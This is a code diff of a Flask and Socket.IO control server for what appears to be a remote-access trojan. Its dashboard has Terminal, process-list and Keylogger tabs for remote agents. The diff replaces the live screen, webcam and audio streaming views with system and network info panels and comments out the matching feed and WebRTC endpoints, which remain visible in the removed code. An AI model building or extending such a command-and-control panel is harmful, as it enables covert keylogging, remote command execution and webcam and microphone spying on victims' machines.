@@ -1317,10 +1317,14 @@ DASHBOARD_HTML = r'''
   .metric-pill .v{font-weight:800;font-size:1.3rem;color:#fff}
   .terminal{height:260px;padding:12px;border-radius:10px;background:#071226;border:1px solid rgba(255,255,255,0.02);overflow:auto;font-family:monospace;color:#8ef0c5}
 
-  /* Videos row inside center */
-  .videos{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:10px}
-  .video-card{height:180px;border-radius:10px;background:#000;display:flex;flex-direction:column;overflow:hidden}
-  .video-card video{width:100%;height:100%;object-fit:cover}
+  /* System Overview sections */
+  .system-overview{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:10px}
+  .overview-section{padding:16px;border-radius:10px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.05)}
+  .overview-section h4{margin:0 0 12px 0;color:#fff;font-size:1rem;font-weight:600}
+  .info-display{display:flex;flex-direction:column;gap:8px}
+  .info-item{display:flex;justify-content:space-between;align-items:center;padding:6px 0}
+  .info-item .label{color:var(--muted);font-size:0.9rem}
+  .info-item span:last-child{color:#fff;font-weight:500;text-align:right}
 
   /* Small helpers */
   .muted{color:var(--muted)}
@@ -1348,9 +1352,9 @@ DASHBOARD_HTML = r'''
       </div>
 
       <div class="nav-tabs" style="margin-left:22px">
-        <div class="nav-tab">Overview</div>
+        <div class="nav-tab active">Overview</div>
         <div class="nav-tab">List Process</div>
-        <div class="nav-tab active">Streaming</div>
+        <div class="nav-tab">System Info</div>
         <div class="nav-tab">Terminal</div>
         <div class="nav-tab">Keylogger</div>
         
@@ -1387,10 +1391,10 @@ DASHBOARD_HTML = r'''
       </div>
 
       <div class="controls">
-        <button class="control-btn primary" onclick="startScreenStream()">Start Screen</button>
-        <button class="control-btn" onclick="startCameraStream()">Start Camera</button>
+        <button class="control-btn primary" onclick="getSystemInfo()">System Info</button>
+        <button class="control-btn" onclick="getNetworkInfo()">Network Info</button>
         <button class="control-btn" onclick="listProcesses()">List Processes</button>
-        <button class="control-btn" onclick="stopAllStreams()">Stop All</button>
+        <button class="control-btn" onclick="refreshOverview()">Refresh Overview</button>
       </div>
     </div>
 
@@ -1442,16 +1446,31 @@ DASHBOARD_HTML = r'''
         </div>
       </div>
 
-      <!-- Videos -->
+      <!-- System Overview -->
       <div style="display:flex;gap:12px">
         <div class="card" style="flex:1">
           <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
-            <div style="font-weight:700">Live Screen</div>
-            <div class="muted small">Agent stream</div>
+            <div style="font-weight:700">System Overview</div>
+            <div class="muted small">Agent information</div>
           </div>
-          <div class="videos">
-            <div class="video-card"><video id="screen-video" autoplay muted playsinline></video></div>
-            <div class="video-card"><video id="camera-video" autoplay muted playsinline></video></div>
+          <div class="system-overview">
+            <div class="overview-section">
+              <h4>System Information</h4>
+              <div id="system-info-display" class="info-display">
+                <div class="info-item"><span class="label">OS:</span> <span id="os-info">Loading...</span></div>
+                <div class="info-item"><span class="label">CPU:</span> <span id="cpu-info">Loading...</span></div>
+                <div class="info-item"><span class="label">Memory:</span> <span id="memory-info">Loading...</span></div>
+                <div class="info-item"><span class="label">Disk:</span> <span id="disk-info">Loading...</span></div>
+              </div>
+            </div>
+            <div class="overview-section">
+              <h4>Network Information</h4>
+              <div id="network-info-display" class="info-display">
+                <div class="info-item"><span class="label">IP Address:</span> <span id="ip-info">Loading...</span></div>
+                <div class="info-item"><span class="label">Hostname:</span> <span id="hostname-info">Loading...</span></div>
+                <div class="info-item"><span class="label">Network:</span> <span id="network-status">Loading...</span></div>
+              </div>
+            </div>
           </div>
         </div>
 
@@ -1463,9 +1482,9 @@ DASHBOARD_HTML = r'''
 
           <div class="metric-grid" style="margin-top:12px">
             <div class="metric-pill"><div class="v" id="m1">12</div><div class="small muted">Active Agents</div></div>
-            <div class="metric-pill"><div class="v" id="m2">3</div><div class="small muted">Active Streams</div></div>
-            <div class="metric-pill"><div class="v" id="m3">95%</div><div class="small muted">Stream Health</div></div>
-            <div class="metric-pill"><div class="v" id="m4">120ms</div><div class="small muted">Avg Latency</div></div>
+            <div class="metric-pill"><div class="v" id="m2">5</div><div class="small muted">Online Systems</div></div>
+            <div class="metric-pill"><div class="v" id="m3">98%</div><div class="small muted">System Health</div></div>
+            <div class="metric-pill"><div class="v" id="m4">45ms</div><div class="small muted">Response Time</div></div>
           </div>
 
           <div style="margin-top:12px;font-weight:700">Output</div>
@@ -1599,13 +1618,29 @@ DASHBOARD_HTML = r'''
   function updateMetric(id,val){ const el=document.getElementById(id); if(el) el.innerText=val; }
   function appendToEl(id,txt){ const e=document.getElementById(id); if(e) e.innerText += '\\n'+txt; }
 
-  /* --------- placeholder functions preserved from original file - keep your existing implementations if needed --------- */
+  /* --------- Overview and system information functions --------- */
   function issueCommand(){ const cmd = document.getElementById('command')?.value || ''; if(cmd) { socket.emit('issue_command', {command:cmd}); appendLog('Issued command: '+cmd);} }
   function listProcesses(){ socket.emit('list_processes'); appendLog('Requested process list'); }
-  function startScreenStream(){ socket.emit('start_screen_stream'); appendLog('Start screen stream request'); }
-  function startCameraStream(){ socket.emit('start_camera_stream'); appendLog('Start camera stream request'); }
-  function stopAllStreams(){ socket.emit('stop_all_streams'); appendLog('Stop all streams request'); }
-  function stopScreenStream(){ socket.emit('stop_screen_stream'); appendLog('Stop screen stream request'); }
+  function getSystemInfo(){ socket.emit('get_system_info'); appendLog('Requested system information'); }
+  function getNetworkInfo(){ socket.emit('get_network_info'); appendLog('Requested network information'); }
+  function refreshOverview(){ socket.emit('refresh_overview'); appendLog('Refreshing overview data'); }
+  
+  // Handle system info response
+  socket.on('system_info_response', function(data) {
+    if(data.os) document.getElementById('os-info').textContent = data.os;
+    if(data.cpu) document.getElementById('cpu-info').textContent = data.cpu;
+    if(data.memory) document.getElementById('memory-info').textContent = data.memory;
+    if(data.disk) document.getElementById('disk-info').textContent = data.disk;
+    appendLog('System information updated');
+  });
+  
+  // Handle network info response
+  socket.on('network_info_response', function(data) {
+    if(data.ip) document.getElementById('ip-info').textContent = data.ip;
+    if(data.hostname) document.getElementById('hostname-info').textContent = data.hostname;
+    if(data.status) document.getElementById('network-status').textContent = data.status;
+    appendLog('Network information updated');
+  });
   function changePassword(){
     const p = document.getElementById('new-pass').value;
     if(!p || p.length<8){ alert('Choose password >= 8 chars'); return; }
@@ -1653,7 +1688,7 @@ def index():
 def dashboard():
     return DASHBOARD_HTML
 
-# --- Real-time Streaming Endpoints (optimized for 0.5-second intervals) ---
+# --- Real-time Streaming Endpoints (COMMENTED OUT - REPLACED WITH OVERVIEW) ---
 # 
 # STREAMING OPTIMIZATION FOR REAL-TIME MONITORING:
 # - Frame interval: 0.5 seconds (2 FPS)
@@ -1662,125 +1697,125 @@ def dashboard():
 # - Better performance for monitoring applications
 #
 
-VIDEO_FRAMES = defaultdict(lambda: None)
-CAMERA_FRAMES = defaultdict(lambda: None)
-AUDIO_CHUNKS = defaultdict(lambda: queue.Queue())
+# VIDEO_FRAMES = defaultdict(lambda: None)
+# CAMERA_FRAMES = defaultdict(lambda: None)
+# AUDIO_CHUNKS = defaultdict(lambda: queue.Queue())
 
 # Frame timing for real-time monitoring
-FRAME_INTERVAL = 0.5  # 0.5-second intervals for 2 FPS
+# FRAME_INTERVAL = 0.5  # 0.5-second intervals for 2 FPS
 
-# HTTP streaming endpoints for browser compatibility
-@app.route('/video_feed/<agent_id>')
-@require_auth
-def video_feed(agent_id):
-    """Stream video feed for a specific agent"""
-    def generate_video():
-        while True:
-            if agent_id in VIDEO_FRAMES_H264 and VIDEO_FRAMES_H264[agent_id]:
-                frame = VIDEO_FRAMES_H264[agent_id]
-                yield (b'--frame\r\n'
-                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
-            else:
-                # Generate a demo frame with agent ID for testing
-                import io
-                from PIL import Image, ImageDraw, ImageFont
-                
-                # Create a demo image
-                img = Image.new('RGB', (640, 480), color='#1e40af')
-                draw = ImageDraw.Draw(img)
-                
-                # Try to use a font, fallback to default if not available
-                try:
-                    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 36)
-                except:
-                    font = ImageFont.load_default()
-                
-                # Draw demo text
-                draw.text((320, 200), f"Agent {agent_id}", fill='white', anchor='mm', font=font)
-                draw.text((320, 250), "Screen Stream", fill='white', anchor='mm', font=font)
-                draw.text((320, 300), "Demo Mode", fill='white', anchor='mm', font=font)
-                
-                # Convert to JPEG
-                img_io = io.BytesIO()
-                img.save(img_io, 'JPEG', quality=85)
-                img_io.seek(0)
-                demo_frame = img_io.getvalue()
-                
-                yield (b'--frame\r\n'
-                       b'Content-Type: image/jpeg\r\n\r\n' + demo_frame + b'\r\n')
-            time.sleep(0.5)  # 2 FPS
-    
-    return Response(generate_video(),
-                    mimetype='multipart/x-mixed-replace; boundary=frame',
-                    headers={'Cache-Control': 'no-cache, no-store, must-revalidate',
-                            'Pragma': 'no-cache',
-                            'Expires': '0'})
+# HTTP streaming endpoints for browser compatibility (COMMENTED OUT)
+# @app.route('/video_feed/<agent_id>')
+# @require_auth
+# def video_feed(agent_id):
+#     """Stream video feed for a specific agent"""
+#     def generate_video():
+#         while True:
+#             if agent_id in VIDEO_FRAMES_H264 and VIDEO_FRAMES_H264[agent_id]:
+#                 frame = VIDEO_FRAMES_H264[agent_id]
+#                 yield (b'--frame\r\n'
+#                        b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
+#             else:
+#                 # Generate a demo frame with agent ID for testing
+#                 import io
+#                 from PIL import Image, ImageDraw, ImageFont
+#                 
+#                 # Create a demo image
+#                 img = Image.new('RGB', (640, 480), color='#1e40af')
+#                 draw = ImageDraw.Draw(img)
+#                 
+#                 # Try to use a font, fallback to default if not available
+#                 try:
+#                     font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 36)
+#                 except:
+#                     font = ImageFont.load_default()
+#                 
+#                 # Draw demo text
+#                 draw.text((320, 200), f"Agent {agent_id}", fill='white', anchor='mm', font=font)
+#                 draw.text((320, 250), "Screen Stream", fill='white', anchor='mm', font=font)
+#                 draw.text((320, 300), "Demo Mode", fill='white', anchor='mm', font=font)
+#                 
+#                 # Convert to JPEG
+#                 img_io = io.BytesIO()
+#                 img.save(img_io, 'JPEG', quality=85)
+#                 img_io.seek(0)
+#                 demo_frame = img_io.getvalue()
+#                 
+#                 yield (b'--frame\r\n'
+#                        b'Content-Type: image/jpeg\r\n\r\n' + demo_frame + b'\r\n')
+#             time.sleep(0.5)  # 2 FPS
+#     
+#     return Response(generate_video(),
+#                     mimetype='multipart/x-mixed-replace; boundary=frame',
+#                     headers={'Cache-Control': 'no-cache, no-store, must-revalidate',
+#                             'Pragma': 'no-cache',
+#                             'Expires': '0'})
 
-@app.route('/camera_feed/<agent_id>')
-@require_auth
-def camera_feed(agent_id):
-    """Stream camera feed for a specific agent"""
-    def generate_camera():
-        while True:
-            if agent_id in CAMERA_FRAMES_H264 and CAMERA_FRAMES_H264[agent_id]:
-                frame = CAMERA_FRAMES_H264[agent_id]
-                yield (b'--frame\r\n'
-                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
-            else:
-                # Generate a demo frame with agent ID for testing
-                import io
-                from PIL import Image, ImageDraw, ImageFont
-                
-                # Create a demo image
-                img = Image.new('RGB', (640, 480), color='#059669')
-                draw = ImageDraw.Draw(img)
-                
-                # Try to use a font, fallback to default if not available
-                try:
-                    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 36)
-                except:
-                    font = ImageFont.load_default()
-                
-                # Draw demo text
-                draw.text((320, 200), f"Agent {agent_id}", fill='white', anchor='mm', font=font)
-                draw.text((320, 250), "Camera Stream", fill='white', anchor='mm', font=font)
-                draw.text((320, 300), "Demo Mode", fill='white', anchor='mm', font=font)
-                
-                # Convert to JPEG
-                img_io = io.BytesIO()
-                img.save(img_io, 'JPEG', quality=85)
-                img_io.seek(0)
-                demo_frame = img_io.getvalue()
-                
-                yield (b'--frame\r\n'
-                       b'Content-Type: image/jpeg\r\n\r\n' + demo_frame + b'\r\n')
-            time.sleep(0.5)  # 2 FPS
-    
-    return Response(generate_camera(),
-                    mimetype='multipart/x-mixed-replace; boundary=frame',
-                    headers={'Cache-Control': 'no-cache, no-store, must-revalidate',
-                            'Pragma': 'no-cache',
-                            'Expires': '0'})
+# @app.route('/camera_feed/<agent_id>')
+# @require_auth
+# def camera_feed(agent_id):
+#     """Stream camera feed for a specific agent"""
+#     def generate_camera():
+#         while True:
+#             if agent_id in CAMERA_FRAMES_H264 and CAMERA_FRAMES_H264[agent_id]:
+#                 frame = CAMERA_FRAMES_H264[agent_id]
+#                 yield (b'--frame\r\n'
+#                        b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
+#             else:
+#                 # Generate a demo frame with agent ID for testing
+#                 import io
+#                 from PIL import Image, ImageDraw, ImageFont
+#                 
+#                 # Create a demo image
+#                 img = Image.new('RGB', (640, 480), color='#059669')
+#                 draw = ImageDraw.Draw(img)
+#                 
+#                 # Try to use a font, fallback to default if not available
+#                 try:
+#                     font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 36)
+#                 except:
+#                     font = ImageFont.load_default()
+#                 
+#                 # Draw demo text
+#                 draw.text((320, 200), f"Agent {agent_id}", fill='white', anchor='mm', font=font)
+#                 draw.text((320, 250), "Camera Stream", fill='white', anchor='mm', font=font)
+#                 draw.text((320, 300), "Demo Mode", fill='white', anchor='mm', font=font)
+#                 
+#                 # Convert to JPEG
+#                 img_io = io.BytesIO()
+#                 img.save(img_io, 'JPEG', quality=85)
+#                 img_io.seek(0)
+#                 demo_frame = img_io.getvalue()
+#                 
+#                 yield (b'--frame\r\n'
+#                        b'Content-Type: image/jpeg\r\n\r\n' + demo_frame + b'\r\n')
+#             time.sleep(0.5)  # 2 FPS
+#     
+#     return Response(generate_camera(),
+#                     mimetype='multipart/x-mixed-replace; boundary=frame',
+#                     headers={'Cache-Control': 'no-cache, no-store, must-revalidate',
+#                             'Pragma': 'no-cache',
+#                             'Expires': '0'})
 
-@app.route('/audio_feed/<agent_id>')
-@require_auth
-def audio_feed(agent_id):
-    """Stream audio feed for a specific agent"""
-    def generate_audio():
-        while True:
-            if agent_id in AUDIO_FRAMES_OPUS and AUDIO_FRAMES_OPUS[agent_id]:
-                frame = AUDIO_FRAMES_OPUS[agent_id]
-                yield frame
-            else:
-                # Send silence if no data available
-                yield b'\x00' * 1024
-            time.sleep(0.1)  # 10 FPS for audio
-    
-    return Response(generate_audio(),
-                    mimetype='audio/wav',
-                    headers={'Cache-Control': 'no-cache, no-store, must-revalidate',
-                            'Pragma': 'no-cache',
-                            'Expires': '0'})
+# @app.route('/audio_feed/<agent_id>')
+# @require_auth
+# def audio_feed(agent_id):
+#     """Stream audio feed for a specific agent"""
+#     def generate_audio():
+#         while True:
+#             if agent_id in AUDIO_FRAMES_OPUS and AUDIO_FRAMES_OPUS[agent_id]:
+#                 frame = AUDIO_FRAMES_OPUS[agent_id]
+#                 yield frame
+#             else:
+#                 # Send silence if no data available
+#                 yield b'\x00' * 1024
+#             time.sleep(0.1)  # 10 FPS for audio
+#     
+#     return Response(generate_audio(),
+#                     mimetype='audio/wav',
+#                     headers={'Cache-Control': 'no-cache, no-store, must-revalidate',
+#                             'Pragma': 'no-cache',
+#                             'Expires': '0'})
 
 # --- Socket.IO Event Handlers ---
 
@@ -2154,58 +2189,58 @@ def handle_webrtc_ice_candidate(data):
     except Exception as e:
         print(f"Error adding ICE candidate for {agent_id}: {e}")
 
-@socketio.on('webrtc_start_streaming')
-def handle_webrtc_start_streaming(data):
-    """Handle WebRTC streaming start request"""
-    agent_id = data.get('agent_id')
-    stream_type = data.get('type', 'all')  # screen, audio, camera, all
-    
-    if not agent_id:
-        emit('webrtc_error', {'message': 'Agent ID required'}, room=request.sid)
-        return
-    
-    try:
-        # Ensure peer connection exists
-        if agent_id not in WEBRTC_PEER_CONNECTIONS:
-            pc = create_webrtc_peer_connection(agent_id)
-            if not pc:
-                emit('webrtc_error', {'message': 'Failed to create peer connection'}, room=request.sid)
-                return
-        
-        # Notify agent to start WebRTC streaming
-        emit('start_webrtc_streaming', {
-            'type': stream_type,
-            'ice_servers': WEBRTC_CONFIG['ice_servers'],
-            'codecs': WEBRTC_CONFIG['codecs']
-        }, room=request.sid)
-        
-        print(f"WebRTC streaming started for {agent_id} ({stream_type})")
-        
-    except Exception as e:
-        print(f"Error starting WebRTC streaming for {agent_id}: {e}")
-        emit('webrtc_error', {'message': f'Error starting streaming: {str(e)}'}, room=request.sid)
+# @socketio.on('webrtc_start_streaming')
+# def handle_webrtc_start_streaming(data):
+#     """Handle WebRTC streaming start request"""
+#     agent_id = data.get('agent_id')
+#     stream_type = data.get('type', 'all')  # screen, audio, camera, all
+#     
+#     if not agent_id:
+#         emit('webrtc_error', {'message': 'Agent ID required'}, room=request.sid)
+#         return
+#     
+#     try:
+#         # Ensure peer connection exists
+#         if agent_id not in WEBRTC_PEER_CONNECTIONS:
+#             pc = create_webrtc_peer_connection(agent_id)
+#             if not pc:
+#                 emit('webrtc_error', {'message': 'Failed to create peer connection'}, room=request.sid)
+#                 return
+#         
+#         # Notify agent to start WebRTC streaming
+#         emit('start_webrtc_streaming', {
+#             'type': stream_type,
+#             'ice_servers': WEBRTC_CONFIG['ice_servers'],
+#             'codecs': WEBRTC_CONFIG['codecs']
+#         }, room=request.sid)
+#         
+#         print(f"WebRTC streaming started for {agent_id} ({stream_type})")
+#         
+#     except Exception as e:
+#         print(f"Error starting WebRTC streaming for {agent_id}: {e}")
+#         emit('webrtc_error', {'message': f'Error starting streaming: {str(e)}'}, room=request.sid)
 
-@socketio.on('webrtc_stop_streaming')
-def handle_webrtc_stop_streaming(data):
-    """Handle WebRTC streaming stop request"""
-    agent_id = data.get('agent_id')
-    
-    if not agent_id:
-        emit('webrtc_error', {'message': 'Agent ID required'}, room=request.sid)
-        return
-    
-    try:
-        # Close WebRTC connection
-        close_webrtc_connection(agent_id)
-        
-        # Notify agent to stop WebRTC streaming
-        emit('stop_webrtc_streaming', {}, room=request.sid)
-        
-        print(f"WebRTC streaming stopped for {agent_id}")
-        
-    except Exception as e:
-        print(f"Error stopping WebRTC streaming for {agent_id}: {e}")
-        emit('webrtc_error', {'message': f'Error stopping streaming: {str(e)}'}, room=request.sid)
+# @socketio.on('webrtc_stop_streaming')
+# def handle_webrtc_stop_streaming(data):
+#     """Handle WebRTC streaming stop request"""
+#     agent_id = data.get('agent_id')
+#     
+#     if not agent_id:
+#         emit('webrtc_error', {'message': 'Agent ID required'}, room=request.sid)
+#         return
+#     
+#     try:
+#         # Close WebRTC connection
+#         close_webrtc_connection(agent_id)
+#         
+#         # Notify agent to stop WebRTC streaming
+#         emit('stop_webrtc_streaming', {}, room=request.sid)
+#         
+#         print(f"WebRTC streaming stopped for {agent_id}")
+#         
+#     except Exception as e:
+#         print(f"Error stopping WebRTC streaming for {agent_id}: {e}")
+#         emit('webrtc_error', {'message': f'Error stopping streaming: {str(e)}'}, room=request.sid)
 
 @socketio.on('webrtc_get_stats')
 def handle_webrtc_get_stats(data):
